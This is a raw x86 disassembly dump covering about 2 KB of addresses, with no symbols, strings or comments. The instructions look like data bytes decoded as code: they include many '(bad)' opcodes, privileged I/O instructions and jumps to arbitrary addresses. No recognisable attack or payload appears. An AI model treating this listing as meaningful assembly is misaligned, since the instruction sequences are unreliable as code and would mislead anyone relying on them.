  43927d:	mov    edx,0x9f4575b0
  439282:	mov    ecx,0x101c9e14
  439287:	test   al,0xdb
  439289:	mov    dh,0xb6
  43928b:	mov    eax,ds:0xf5474a32
  439290:	inc    edi
  439291:	push   edx
  439292:	push   eax
  439293:	repz pop edi
  439295:	jne    0x4392ac
  439297:	aam    0x6d
  439299:	jl     0x439303
  43929b:	repnz mov bh,dl
  43929e:	retf   
  43929f:	inc    esi
  4392a0:	aad    0xb6
  4392a2:	mov    al,0xa4
  4392a4:	xchg   DWORD PTR [ecx],esi
  4392a6:	mov    ebx,0x4d780f11
  4392ab:	adc    eax,0xf00eb6dd
  4392b0:	(bad)  
  4392b1:	push   cs
  4392b2:	pop    eax
  4392b3:	inc    ecx
  4392b4:	and    DWORD PTR [ebp+0x22b600ae],0x26
  4392bb:	jbe    0x439288
  4392bd:	jno    0x4392eb
  4392bf:	jne    0x439302
  4392c1:	les    eax,FWORD PTR [ebp+0x61300413]
  4392c7:	inc    edi
  4392c8:	ret    0x151d
  4392cb:	sub    eax,0x8b995c34
  4392d0:	xchg   esi,eax
  4392d1:	cdq    
  4392d2:	or     al,0xdc
  4392d4:	pop    edx
  4392d5:	push   edi
  4392d6:	or     ecx,DWORD PTR [ecx+0x2d]
  4392d9:	pop    edi
  4392da:	pop    ss
  4392db:	ds push 0x8aa0ac73
  4392e1:	or     eax,0xcb1fc14
  4392e6:	adc    ebx,ebx
  4392e8:	jbe    0x4392d5
  4392ea:	ins    BYTE PTR es:[edi],dx
  4392eb:	sub    DWORD PTR [ebx+0x941d599],ebx
  4392f1:	retf   
  4392f2:	add    al,0x6b
  4392f4:	add    BYTE PTR [eax+0x13],ah
  4392f7:	adc    eax,0xc9c65e7
  4392fc:	stos   BYTE PTR es:[edi],al
  4392fd:	popa   
  4392fe:	pop    es
  4392ff:	jo     0x439364
  439301:	jnp    0x439299
  439303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439304:	sar    DWORD PTR [ebp+0x5e],1
  439307:	jnp    0x43932b
  439309:	ins    BYTE PTR es:[edi],dx
  43930a:	and    BYTE PTR [edx-0x56d01a93],cl
  439310:	jp     0x439365
  439312:	xchg   esp,eax
  439313:	mov    ah,0x41
  439315:	rcl    DWORD PTR ds:0x96f0afc2,1
  43931b:	mov    BYTE PTR [eax-0x7974bb2f],bh
  439321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439322:	inc    ebp
  439323:	loop   0x439327
  439325:	pop    ss
  439326:	fdivr  DWORD PTR [edx+0x73c5a4d7]
  43932c:	mov    BYTE PTR [eax+0x50d6bd56],0x55
  439333:	retf   
  439334:	ins    DWORD PTR es:[edi],dx
  439335:	loope  0x439395
  439337:	fsub   QWORD PTR [eax]
  439339:	(bad)  
  43933b:	cmp    ch,al
  43933d:	sbb    ecx,DWORD PTR [eax-0x33fd2581]
  439343:	cs mov eax,0x70eb75fa
  439349:	push   esp
  43934a:	jno    0x439333
  43934c:	imul   ebp,esp,0x7d012ccb
  439352:	pusha  
  439353:	push   edi
  439354:	push   0x3b7ba4dc
  439359:	add    ebp,DWORD PTR [edx+0x6b]
  43935c:	xor    DWORD PTR [edx],0xfdcc7bf9
  439362:	fmul   DWORD PTR [ebp+0x965b142]
  439368:	mov    ch,0x85
  43936a:	push   edi
  43936b:	lahf   
  43936c:	mov    ch,0xab
  43936e:	pusha  
  43936f:	stc    
  439370:	mov    bl,BYTE PTR [esi]
  439372:	add    BYTE PTR [ebp+0x5],bl
  439375:	in     eax,0xd0
  439377:	sbb    al,0x9a
  439379:	dec    edx
  43937a:	push   ebp
  43937b:	dec    ebp
  43937c:	add    al,0xf0
  43937e:	mov    bh,0xc2
  439380:	(bad)  [ebp+0x760ab625]
  439386:	and    ch,bh
  439388:	xor    bl,BYTE PTR [ebx-0x18]
  43938b:	(bad)  
  43938c:	adc    ch,BYTE PTR [ebp-0x25]
  43938f:	retf   0xb942
  439392:	and    BYTE PTR [eax],bh
  439394:	or     eax,0xa2adedf5
  439399:	sbb    esp,ebp
  43939b:	(bad)  [edx+0x5e4a2e]
  4393a1:	and    cl,bl
  4393a3:	inc    ebp
  4393a4:	out    dx,al
  4393a5:	(bad)  
  4393a6:	add    DWORD PTR [ebp-0x76c9d173],0x33
  4393ad:	into   
  4393ae:	xchg   ecx,eax
  4393af:	adc    DWORD PTR ss:[ebp+0x1b],0x0
  4393b4:	mov    ds:0x3726007d,al
  4393b9:	mov    BYTE PTR [esi],0x80
  4393bc:	pop    ebp
  4393bd:	sub    BYTE PTR [edx],al
  4393bf:	or     bh,dl
  4393c1:	jbe    0x4393b5
  4393c3:	adc    al,BYTE PTR [esi-0x6e3ebc9e]
  4393c9:	std    
  4393ca:	and    edx,DWORD PTR [edx+0xd0bb6c3]
  4393d0:	(bad)  
  4393d1:	rcl    BYTE PTR [ebx+0x3a],1
  4393d4:	push   0x6a
  4393d6:	xor    BYTE PTR [ebx+ecx*1],dl
  4393d9:	mov    bl,0xa8
  4393db:	in     eax,0xc6
  4393dd:	(bad)  
  4393de:	pop    edi
  4393df:	sub    al,0x1c
  4393e1:	cmp    edx,esp
  4393e3:	sub    eax,0xb0b00099
  4393e8:	or     ecx,DWORD PTR [ebp-0x23e98b41]
  4393ee:	and    ch,BYTE PTR [edx+0x55a3d004]
  4393f4:	loopne 0x4393d2
  4393f6:	fiadd  DWORD PTR [edx+0x55]
  4393f9:	stos   BYTE PTR es:[edi],al
  4393fa:	sbb    eax,0x5e9c28e
  4393ff:	jmp    0x444b01ae
  439404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439405:	jno    0x4393f2
  439407:	sbb    DWORD PTR [edx+0x8edb505],0x57
  43940e:	retf   0xe6e
  439411:	sub    ebx,DWORD PTR [edx]
  439413:	sub    bh,BYTE PTR [edx+0x7dd90935]
  439419:	sbb    dh,0xd9
  43941c:	ret    
  43941d:	sbb    BYTE PTR ds:0x5caf1705,0x20
  439424:	mov    bh,0x10
  439426:	hlt    
  439427:	jbe    0x43947a
  439429:	mov    ah,0x1
  43942b:	vsubss xmm5,xmm5,DWORD PTR [esi+0x22]
  439430:	mov    ch,0x51
  439432:	mov    cl,0xa9
  439434:	add    BYTE PTR [edi+0x6c40d303],ah
  43943a:	and    dh,BYTE PTR [esi+0x64]
  43943d:	mov    dh,0xa0
  43943f:	sub    al,0x18
  439441:	cld    
  439442:	mov    dh,0x81
  439444:	sbb    BYTE PTR ds:0x2488cd3c,0x68
  43944b:	ret    0xa289
  43944e:	sbb    eax,0xaa41b715
  439453:	jae    0x43944d
  439455:	cmc    
  439456:	add    DWORD PTR [ecx-0x3f],eax
  439459:	ret    0xd08e
  43945c:	pop    esi
  43945d:	pop    ebp
  43945e:	cli    
  43945f:	xchg   esi,eax
  439460:	imul   esp,DWORD PTR [edx],0xffffffe2
  439463:	(bad)  
  439464:	shr    DWORD PTR [ebx+0x71],1
  439467:	in     al,dx
  439468:	dec    edx
  439469:	js     0x4394ca
  43946b:	imul   eax,DWORD PTR [eax-0x308bbaf3],0xffffff86
  439472:	iret   
  439473:	add    esi,DWORD PTR [eax]
  439475:	dec    edi
  439476:	pop    esp
  439477:	call   0x8028847c
  43947c:	and    DWORD PTR [edi],esi
  43947e:	les    esp,FWORD PTR [ebx]
  439480:	add    ecx,edx
  439482:	es stos BYTE PTR es:[edi],al
  439484:	cmp    al,0xf0
  439486:	bound  edx,QWORD PTR [edx-0x18]
  439489:	and    BYTE PTR [edx+0x7a0fdb75],bh
  43948f:	add    BYTE PTR [ebp+0x136987ef],0x15
  439496:	pop    esp
  439497:	dec    esp
  439498:	in     eax,dx
  439499:	mov    eax,0x447cf621
  43949e:	rol    edx,0xd2
  4394a1:	inc    edx
  4394a2:	sbb    al,0xb8
  4394a4:	pop    edi
  4394a5:	pop    edx
  4394a6:	or     eax,0xc410dac1
  4394ab:	int    0xe9
  4394ad:	pop    ecx
  4394ae:	pop    eax
  4394af:	mov    esp,tr4
  4394b2:	ret    
  4394b3:	push   0x6b
  4394b5:	mov    eax,ds:0x3d066529
  4394ba:	pop    ebx
  4394bb:	add    al,0x16
  4394bd:	and    BYTE PTR [esi-0x5b],ch
  4394c0:	lods   eax,DWORD PTR ds:[esi]
  4394c1:	and    edi,DWORD PTR [esi]
  4394c3:	sbb    dh,ch
  4394c5:	mov    esp,0xd415d576
  4394ca:	es sbb eax,0xdbc8621d
  4394d0:	inc    esp
  4394d1:	je     0x43947e
  4394d3:	push   esp
  4394d4:	xor    DWORD PTR [ebp-0x71483830],0xffffff80
  4394db:	or     eax,0xe9e2e052
  4394e0:	inc    esi
  4394e1:	mov    edi,0xbb5becbd
  4394e6:	jne    0x4394f9
  4394e8:	cmp    bl,BYTE PTR [eax+0x536c1c44]
  4394ee:	add    eax,0xd8a29b2e
  4394f3:	outs   dx,BYTE PTR ds:[esi]
  4394f4:	jno    0x4394b9
  4394f6:	xor    DWORD PTR ds:0x60918a93,esi
  4394fc:	inc    edi
  4394fd:	mov    ah,0xdd
  4394ff:	sbb    cl,BYTE PTR [eax-0x7d]
  439502:	xchg   ebx,eax
  439503:	loope  0x4394e5
  439505:	sub    al,dh
  439507:	shr    BYTE PTR [esi-0x5273a460],cl
  43950d:	or     bl,BYTE PTR [edi+esi*1-0x25915aa4]
  439514:	ss inc ebp
  439516:	rcr    esp,0x7f
  439519:	in     eax,0xef
  43951b:	retf   
  43951c:	mov    eax,ds:0xa2685c5f
  439521:	inc    ebp
  439522:	adc    al,BYTE PTR [edi+ebp*2]
  439525:	std    
  439526:	pop    ebp
  439527:	retf   0x5053
  43952a:	sub    al,0x0
  43952c:	sbb    ecx,DWORD PTR [edi+0x2a3a36a9]
  439532:	pusha  
  439533:	inc    ecx
  439534:	fwait
  439535:	jmp    0x415c2f2f
  43953a:	adc    eax,0x877da8a
  43953f:	scas   al,BYTE PTR es:[edi]
  439540:	fcom   DWORD PTR ds:0x3cce28dc
  439546:	outs   dx,BYTE PTR ds:[esi]
  439547:	jo     0x43953e
  439549:	lock repnz dec ebp
  43954c:	lds    ebp,FWORD PTR [ebp+0x38f59aa9]
  439552:	sub    al,0x4d
  439554:	sbb    al,0x34
  439556:	and    eax,0xbd8289a0
  43955b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43955c:	mov    BYTE PTR [edx+0x5d],ch
  43955f:	push   0xb2866e82
  439564:	inc    edx
  439565:	stos   DWORD PTR es:[edi],eax
  439566:	imul   esp,DWORD PTR [edi-0x31],0xffffffcd
  43956a:	jnp    0x439556
  43956c:	inc    edx
  43956d:	pop    ss
  43956e:	cmp    dh,ah
  439570:	scas   eax,DWORD PTR es:[edi]
  439571:	mov    dh,cl
  439573:	cmp    DWORD PTR [eax-0x7a7e96bf],0xa1230b76
  43957d:	call   0x4b08b16e
  439582:	push   0x1b76d153
  439587:	push   eax
  439588:	gs jbe 0x4395ee
  43958b:	sub    ch,cl
  43958d:	dec    ebp
  43958e:	adc    eax,0xb6a788ec
  439593:	je     0x4395a7
  439595:	sti    
  439596:	scas   al,BYTE PTR es:[edi]
  439597:	mov    BYTE PTR [esi-0xa0624a],dh
  43959d:	adc    BYTE PTR [eax+ebx*1],bl
  4395a0:	sub    eax,0xf6b6b637
  4395a5:	add    dh,BYTE PTR [esi+0x753986af]
  4395ab:	cld    
  4395ac:	xor    BYTE PTR [ebx],cl
  4395ae:	aad    0xaa
  4395b0:	mov    al,ds:0x10379b17
  4395b5:	and    BYTE PTR [edx+0x3],ah
  4395b8:	inc    esp
  4395b9:	scas   eax,DWORD PTR es:[edi]
  4395ba:	ds jle 0x4395d4
  4395bd:	jo     0x439568
  4395bf:	ins    DWORD PTR es:[edi],dx
  4395c0:	sub    edx,DWORD PTR gs:[esi+0x65]
  4395c4:	xchg   BYTE PTR [eax-0x3c],al
  4395c7:	or     esp,edx
  4395c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4395ca:	and    eax,0x5c7e9828
  4395cf:	leave  
  4395d0:	mov    ?,WORD PTR [edx-0x60091dd8]
  4395d6:	dec    edi
  4395d7:	clc    
  4395d8:	loop   0x4395c3
  4395da:	fcomp  DWORD PTR [ebx-0x57c924b0]
  4395e0:	sbb    BYTE PTR [eax-0x65],0x61
  4395e4:	dec    edx
  4395e5:	sbb    bl,0x17
  4395e8:	or     esi,DWORD PTR [eax-0x55ed966a]
  4395ee:	sti    
  4395ef:	mov    WORD PTR [esi+0x63],?
  4395f2:	stos   DWORD PTR es:[edi],eax
  4395f3:	test   eax,0xaf19d8a0
  4395f8:	pop    edx
  4395f9:	pop    ecx
  4395fa:	xor    edx,DWORD PTR [edx-0x24bfba2f]
  439600:	push   edx
  439601:	or     esp,esp
  439603:	pminsw mm4,QWORD PTR [eax]
  439606:	push   0xffffffaa
  439608:	shl    BYTE PTR [ebx+0x54],1
  43960b:	jmp    0x439610
  43960d:	shl    BYTE PTR [eax-0x7297af58],cl
  439613:	ins    DWORD PTR es:[edi],dx
  439614:	or     bh,BYTE PTR [edi+0x3b5155d8]
  43961a:	test   DWORD PTR [edx+0x5f],esi
  43961d:	add    ecx,DWORD PTR [edi]
  43961f:	cmp    BYTE PTR [ecx+0x6d],al
  439622:	in     al,dx
  439623:	mov    cl,BYTE PTR [ebp-0x20]
  439626:	inc    ecx
  439627:	mov    bh,0x2
  439629:	adc    dl,al
  43962b:	cs xor eax,0x78bc0a14
  439631:	sbb    edx,esi
  439633:	mov    ds:0xd6cada5a,eax
  439638:	xchg   BYTE PTR [eax],dl
  43963a:	sbb    dl,al
  43963c:	(bad)  
  43963d:	push   cs
  43963e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43963f:	sub    eax,0x70d0baa
  439644:	(bad)  
  439645:	je     0x43966f
  439647:	das    
  439648:	mov    DWORD PTR [eax+0x72c6f2e],esp
  43964e:	add    dl,dl
  439650:	fdivr  DWORD PTR [esi]
  439652:	inc    edx
  439653:	outs   dx,BYTE PTR ds:[esi]
  439654:	mov    ah,0xa0
  439656:	mov    dh,0x5b
  439658:	jnp    0x4395ef
  43965a:	into   
  43965b:	cmp    DWORD PTR [eax+0x2ead86c5],esi
  439661:	test   al,0xa1
  439663:	sub    al,0x31
  439665:	push   eax
  439666:	jl     0x43961e
  439668:	je     0x439695
  43966a:	inc    ecx
  43966b:	xor    BYTE PTR [edi-0x79],al
  43966e:	fist   WORD PTR [edi]
  439670:	inc    esp
  439671:	pop    ss
  439672:	fist   DWORD PTR [esp+edx*2]
  439675:	mov    bh,0xce
  439677:	and    DWORD PTR [ebx+ecx*1],0xffffff90
  43967b:	mov    bh,al
  43967d:	cmp    BYTE PTR [edx+0x77115bb5],0x1b
  439684:	ret    0xaf92
  439687:	xor    ecx,edx
  439689:	(bad)  
  43968a:	pop    esi
  43968b:	mov    ebx,0x7c19a41e
  439690:	loope  0x4396c1
  439692:	lahf   
  439693:	adc    DWORD PTR [edi],edx
  439695:	ss loopne 0x439623
  439698:	jnp    0x4396da
  43969a:	popf   
  43969b:	mov    eax,0x5ba21bdb
  4396a0:	push   edi
  4396a1:	adc    BYTE PTR [edx-0x6b],0xad
  4396a5:	mov    al,ah
  4396a7:	pop    eax
  4396a8:	fcmovnu st,st(2)
  4396aa:	(bad)  
  4396ab:	add    al,0x54
  4396ad:	mov    cl,0x5c
  4396af:	and    BYTE PTR [esi-0x14],cl
  4396b2:	pop    edx
  4396b3:	pusha  
  4396b4:	imul   eax,DWORD PTR ds:0xe78f2fad,0x21
  4396bb:	xchg   edx,eax
  4396bc:	mov    bl,BYTE PTR [ebx-0x25]
  4396bf:	sub    al,BYTE PTR [ecx-0x44]
  4396c2:	jge    0x439729
  4396c4:	or     BYTE PTR [ecx+0x23a2802e],0x7f
  4396cb:	add    BYTE PTR [esi],al
  4396cd:	rol    BYTE PTR [ecx-0x23],1
  4396d0:	sbb    dh,BYTE PTR [edx+0x32]
  4396d3:	stos   BYTE PTR es:[edi],al
  4396d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4396d5:	(bad)  
  4396d6:	retf   
  4396d7:	mov    gs,WORD PTR [eax]
  4396d9:	outs   dx,BYTE PTR ds:[esi]
  4396da:	sub    al,0xb1
  4396dc:	pushf  
  4396dd:	mov    cl,0x82
  4396df:	je     0x439669
  4396e1:	pop    eax
  4396e2:	mov    BYTE PTR [eax-0x25],ch
  4396e5:	cmc    
  4396e6:	push   0x149e5035
  4396eb:	pushf  
  4396ec:	add    edx,DWORD PTR [ecx]
  4396ee:	ins    BYTE PTR es:[edi],dx
  4396ef:	and    al,BYTE PTR [esi+esi*8-0x13d5c09c]
  4396f6:	add    BYTE PTR [edx+0x48],ah
  4396f9:	or     al,0x12
  4396fb:	dec    ecx
  4396fc:	push   ecx
  4396fd:	adc    edx,DWORD PTR [eax+0xb]
  439700:	pop    ebx
  439701:	mov    eax,ds:0xf4c7fb77
  439706:	mov    ecx,0x2c405db6
  43970b:	push   ds
  43970c:	shr    DWORD PTR [ecx+0x338cac62],cl
  439712:	lds    esp,FWORD PTR [ebp+0x72ca0ae]
  439718:	mov    WORD PTR [esp+ecx*2+0x2c],es
  43971c:	mov    ah,0x6d
  43971e:	inc    edi
  43971f:	xacquire xchg BYTE PTR [ebx+0x4a],dh
  439723:	(bad)  
  439724:	ja     0x439757
  439726:	(bad)  
  439727:	ins    DWORD PTR es:[edi],dx
  439728:	and    BYTE PTR [eax],al
  43972a:	outs   dx,BYTE PTR ds:[esi]
  43972b:	add    BYTE PTR [ebp-0x3d0cc845],al
  439731:	xor    BYTE PTR [esi],0xc1
  439734:	lods   eax,DWORD PTR ds:[esi]
  439735:	push   cs
  439736:	inc    ecx
  439737:	push   ds
  439738:	mov    bh,0xbf
  43973a:	and    esp,ecx
  43973c:	and    edx,ebx
  43973e:	ret    0xcd86
  439741:	pop    ss
  439742:	dec    ecx
  439743:	cmp    eax,0x6e3953f4
  439748:	xchg   BYTE PTR [edx],bl
  43974a:	push   0xffffff89
  43974c:	(bad)  
  43974d:	mul    BYTE PTR [ebx]
  43974f:	fidivr DWORD PTR [edx+0x60]
  439752:	mov    dh,0x6
  439754:	mov    ch,0xd1
  439756:	fld    st(0)
  439758:	xor    ebp,DWORD PTR [ebp-0x48bbe8dd]
  43975e:	mov    dh,0xdd
  439760:	mov    esp,0x2fce52cd
  439765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439766:	cmp    ebp,esi
  439768:	inc    esp
  439769:	ins    BYTE PTR es:[edi],dx
  43976a:	mov    edi,0xd490435b
  43976f:	ret    0x3d14
  439772:	into   
  439773:	inc    esp
  439774:	dec    edx
  439775:	sbb    BYTE PTR [ebp+0x6f2ea00e],0x42
  43977c:	icebp  
  43977d:	add    BYTE PTR [ebx+edx*4-0x2baffdf0],bl
  439784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439786:	push   es
  439787:	bound  edi,QWORD PTR [ebx*1-0x4724ccfe]
  43978e:	mov    cl,0x35
  439790:	and    bh,dl
  439792:	push   esi
  439793:	fisub  DWORD PTR [edi]
  439795:	mov    ah,0xa2
  439797:	push   edi
  439798:	inc    esi
  439799:	add    ah,BYTE PTR [edx+0x3156d528]
  43979f:	or     esi,0x40
  4397a2:	pop    ebx
  4397a3:	mov    ebx,0x6fab31d1
  4397a8:	jmp    0xdb1a8f60
  4397ad:	fisubr DWORD PTR [ebp+0x6b]
  4397b0:	retf   0xaedd
  4397b3:	fwait
  4397b4:	push   ebx
  4397b5:	pop    ecx
  4397b6:	push   cs
  4397b7:	(bad)
  4397ba:	ficom  DWORD PTR ds:0xa4a3085c
  4397c0:	or     BYTE PTR [edi],dh
  4397c2:	cwde   
  4397c3:	fadd   DWORD PTR [ecx+0x1]
  4397c6:	sbb    edi,DWORD PTR [edx-0x1481c083]
  4397cc:	repnz add eax,ebx
  4397cf:	fimul  DWORD PTR [esi]
  4397d1:	sbb    ebp,esp
  4397d3:	stc    
  4397d4:	add    cl,BYTE PTR [ebx]
  4397d6:	inc    ecx
  4397d7:	aas    
  4397d8:	inc    esp
  4397d9:	pusha  
  4397da:	sub    BYTE PTR [edx+0x17],0xf5
  4397de:	mov    ds:0x9fbb5b0b,al
  4397e3:	push   0x5
  4397e5:	in     al,dx
  4397e6:	and    ebx,DWORD PTR [edi]
  4397e8:	cmp    eax,0xb6da3a29
  4397ed:	stos   BYTE PTR es:[edi],al
  4397ee:	test   eax,0x94cddfc8
  4397f3:	inc    ecx
  4397f4:	mov    ah,0x75
  4397f6:	add    eax,0x559bbf6d
  4397fb:	fwait
  4397fc:	mov    edi,0x8e35d078
  439801:	call   0x9c854cb8
  439806:	(bad)  
  439807:	popf   
  439808:	push   ecx
  439809:	dec    esi
  43980a:	mov    ebp,0x85c2db6d
  43980f:	sbb    BYTE PTR [esi+0x4dcac980],bh
  439815:	into   
  439816:	mov    esp,0x2e8ae47a
  43981b:	je     0x439871
  43981d:	mov    cl,BYTE PTR [edx+0x58]
  439820:	push   esi
  439821:	adc    dh,BYTE PTR [esi+0x0]
  439824:	shl    DWORD PTR [esi],0x54
  439827:	pop    ebp
  439828:	add    eax,DWORD PTR [ecx+ebx*4]
  43982b:	retf   0x36dd
  43982e:	sbb    ah,BYTE PTR [edx-0x3672cf94]
  439834:	(bad)  
  439835:	sbb    al,0x79
  439837:	ins    BYTE PTR es:[edi],dx
  439838:	push   esp
  439839:	jne    0x43988f
  43983b:	shl    BYTE PTR [eax-0x5d7915e8],cl
  439841:	or     eax,0xc3819600
  439846:	cmp    esi,DWORD PTR [esi+0x6b]
  439849:	and    bh,BYTE PTR [edx-0x7f97793a]
  43984f:	pop    eax
  439850:	das    
  439851:	and    BYTE PTR [esi],0x3e
  439854:	xor    eax,0x16db7d6c
  439859:	out    dx,eax
  43985a:	lock push ebx
  43985c:	jb     0x4398b0
  43985e:	into   
  43985f:	pop    es
  439860:	push   esi
  439861:	call   0xc95b:0x82557628
  439868:	push   ebx
  439869:	cdq    
  43986a:	pop    ebx
  43986b:	fsubr  DWORD PTR [edx-0x69]
  43986e:	add    cl,BYTE PTR [eax+0x7461adc]
  439874:	in     eax,0x32
  439876:	push   ebx
  439877:	fild   DWORD PTR [eax+esi*4]
  43987a:	jno    0x439826
  43987c:	iretw  
  43987e:	out    0x68,al
  439880:	loopne 0x4398f6
  439882:	outs   dx,BYTE PTR ds:[esi]
  439883:	pop    edi
  439884:	fwait
  439885:	mov    ds:0x9b78c85b,al
  43988a:	sahf   
  43988b:	or     dh,bl
  43988d:	out    dx,al
  43988e:	sbb    edx,DWORD PTR [ecx]
  439890:	ins    DWORD PTR es:[edi],dx
  439891:	sbb    edx,DWORD PTR [eax]
  439893:	push   0xad81d1c2
  439898:	mov    ebp,DWORD PTR [eax+0x17]
  43989b:	push   ss
  43989c:	cmp    DWORD PTR [ecx-0x24a60be8],edi
  4398a2:	push   eax
  4398a3:	push   ebp
  4398a4:	fild   DWORD PTR [ebx+eiz*4-0x425fc26e]
  4398ab:	xchg   ecx,eax
  4398ac:	mov    al,0x9
  4398ae:	add    DWORD PTR ds:[ebx+ecx*1-0x3f],edx
  4398b3:	(bad)  
  4398b5:	ins    DWORD PTR es:[edi],dx
  4398b6:	fcmovnu st,st(2)
  4398b8:	mov    dh,0xc3
  4398ba:	cli    
  4398bb:	jp     0x43988d
  4398bd:	or     esi,DWORD PTR [eax+0x53154483]
  4398c3:	xor    eax,0x4a85d541
  4398c8:	adc    al,al
  4398ca:	push   0xa3b698f8
  4398cf:	mov    ds:0xc64d142e,al
  4398d4:	rcr    esi,1
  4398d6:	imul   esi,DWORD PTR ds:0xd6839b5b,0x114a88b0
  4398e0:	nop
  4398e1:	add    al,0xd
  4398e3:	imul   edi,DWORD PTR [ebx],0xffffffa0
  4398e6:	mov    dh,0x2d
  4398e8:	inc    ecx
  4398e9:	xor    al,dh
  4398eb:	xchg   ebx,eax
  4398ec:	and    eax,0x5b82fe53
  4398f1:	add    DWORD PTR [edx-0x1c],ebp
  4398f4:	les    edi,FWORD PTR [esi+edx*2-0x12522ac1]
  4398fb:	mov    ds:0xb07d73a1,al
  439900:	jge    0x4398b9
  439902:	sbb    ebp,DWORD PTR ss:[eax-0x4791af26]
  439909:	cmp    eax,0x21de4245
  43990e:	fcom   DWORD PTR [ebp+0x0]
  439911:	jo     0x439954
  439913:	loopne 0x439944
  439915:	inc    ebx
  439916:	add    eax,0x2859b6db
  43991b:	repnz loope 0x439980
  43991e:	scas   al,BYTE PTR es:[edi]
  43991f:	fcmovbe st,st(4)
  439921:	sub    eax,0x71556143
  439926:	hlt    
  439927:	add    al,0x76
  439929:	rcl    DWORD PTR [ebx+ecx*8+0x5e11d817],cl
  439930:	inc    ebp
  439931:	vpaddsw xmm0,xmm3,XMMWORD PTR [eax]
  439935:	push   ss
  439936:	mov    esp,0x55daa357
  43993b:	push   eax
  43993c:	idiv   DWORD PTR [ecx+0x8]
  43993f:	dec    esp
  439940:	inc    esp
  439941:	add    esp,DWORD PTR ds:0x42f23fa2
  439947:	mov    edi,0x574106b7
  43994c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43994d:	xor    al,0x7
  43994f:	push   ebx
  439950:	mov    ds:0xd6ed43b6,al
  439955:	add    eax,0xf2dd207f
  43995a:	mov    ch,0x83
  43995c:	sub    al,0x82
  43995e:	pop    ebp
  43995f:	les    ecx,FWORD PTR ds:0xd617c41b
  439965:	or     cl,BYTE PTR [eax+0x5d]
  439968:	add    al,0x6d
  43996a:	sub    cl,BYTE PTR [ebp-0x572aa275]
  439970:	xchg   edi,eax
  439971:	mov    dh,0x86
  439973:	mov    al,ds:0x41beaf16
  439978:	sar    DWORD PTR [eax],cl
  43997a:	clc    
  43997b:	dec    ecx
  43997c:	cli    
  43997d:	bound  edx,QWORD PTR [edi+0x41]
  439980:	sbb    eax,0x9a6695d8
  439985:	pop    ebx
  439986:	dec    ebx
  439987:	or     ecx,DWORD PTR [ebp-0x64a3fb67]
  43998d:	popa   
  43998e:	scas   eax,DWORD PTR es:[edi]
  43998f:	sbb    DWORD PTR [eax-0x17ed244a],esp
  439995:	out    dx,eax
  439996:	add    ah,BYTE PTR [ecx+0x64]
  439999:	jmp    0xa0794b6b
  43999e:	push   cs
  43999f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4399a0:	fwait
  4399a1:	lods   al,BYTE PTR ds:[esi]
  4399a2:	(bad)  
  4399a3:	mov    ah,0x76
  4399a5:	push   ecx
  4399a6:	mov    bh,0x12
  4399a8:	aam    0x7a
  4399aa:	and    al,0x7a
  4399ac:	ins    BYTE PTR es:[edi],dx
  4399ad:	cmp    al,0xb0
  4399af:	pop    ss
  4399b0:	shl    DWORD PTR [esi-0x39766df8],0xc5
  4399b7:	add    DWORD PTR [esi+0x658f52ff],edx
  4399bd:	dec    edx
  4399be:	enter  0xab00,0x29
  4399c2:	add    BYTE PTR [esp+eax*1+0x21],cl
  4399c6:	cli    
  4399c7:	ss inc ecx
  4399c9:	mov    bh,0xb6
  4399cb:	xor    al,0xb4
  4399cd:	dec    edx
  4399ce:	mov    al,0xd8
  4399d0:	out    dx,al
  4399d1:	test   al,0xa7
  4399d3:	in     eax,0xc2
  4399d5:	lods   eax,DWORD PTR ds:[esi]
  4399d6:	and    eax,DWORD PTR [eax+0x4fcb3e48]
  4399dc:	jmp    0x439a57
  4399de:	mov    eax,ebp
  4399e0:	pop    ss
  4399e1:	fnsetpm(287 only) 
  4399e3:	stos   BYTE PTR es:[edi],al
  4399e4:	mov    ah,0xb4
  4399e6:	fwait
  4399e7:	test   eax,0x2362ae9a
  4399ec:	stos   BYTE PTR es:[edi],al
  4399ed:	enter  0xec6b,0x27
  4399f1:	sbb    eax,0x2ab6dc04
  4399f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4399f7:	inc    edx
  4399f8:	adc    DWORD PTR [edx],esi
  4399fa:	mov    eax,DWORD PTR [edx+edx*2+0x1b541b11]
  439a01:	scas   al,BYTE PTR es:[edi]
  439a02:	in     al,0xee
  439a04:	int3   
  439a05:	mov    ebx,0x7351da8a
  439a0a:	daa    
  439a0b:	mov    ah,0x42
  439a0d:	or     DWORD PTR [edi],edi
  439a0f:	pusha  
  439a10:	inc    ebx
  439a11:	adc    eax,0xf519e96d
  439a16:	jbe    0x439a5e
  439a18:	test   al,0x71
  439a1a:	jmp    0x43999c
  439a1c:	fs dec esi
  439a1e:	xlat   BYTE PTR ds:[ebx]
  439a1f:	and    ebp,DWORD PTR [ebx-0x4c]
  439a22:	test   al,0xb0
  439a24:	inc    eax
  439a25:	lods   eax,DWORD PTR ds:[esi]
  439a26:	xchg   edi,eax
  439a27:	retf   
  439a28:	nop
  439a29:	dec    edi
  439a2a:	sub    ecx,DWORD PTR [edx+0x1d952d8d]
  439a30:	mov    ds:0xb76c4130,al
  439a35:	ins    DWORD PTR es:[edi],dx
  439a36:	mov    eax,ds:0x62fa738b
  439a3b:	cmp    BYTE PTR [ebx-0x7a],dl
  439a3e:	into   
  439a3f:	in     al,dx
  439a40:	xchg   esi,eax
  439a41:	push   0xffffffdb
  439a43:	inc    eax
  439a44:	mov    cl,0x72
  439a46:	jg     0x439a76
  439a48:	ss mov esp,0x3a170b05
  439a4e:	mov    dl,BYTE PTR [ecx+0x7fdcb860]
  439a54:	xchg   esp,eax
  439a55:	sub    BYTE PTR [ebp+0x4d],ch
  439a58:	ins    DWORD PTR es:[edi],dx
  439a59:	in     eax,0x0
  439a5b:	mov    ds:0xf95efed5,eax
  439a60:	cli    
  439a61:	loopne 0x439a38
  439a63:	push   es
  439a64:	mov    edx,0x438704d4
